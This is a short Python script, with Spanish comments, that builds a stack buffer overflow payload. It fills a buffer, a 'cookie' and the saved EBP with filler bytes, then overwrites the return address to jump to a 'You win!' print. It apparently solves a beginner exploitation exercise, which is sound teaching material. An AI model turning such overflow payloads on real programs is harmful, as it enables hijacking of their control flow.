#payload.py
from struct import pack

ret_addr = 0x0804849c               #Direccion de printf("You win!")

output = "A" * 10                   #llena buf
output += "BBBB"                    #llena cookie
output += "CCCC"                    #llena ebp
output += pack("<I", ret_addr)      #llena return address

print(output)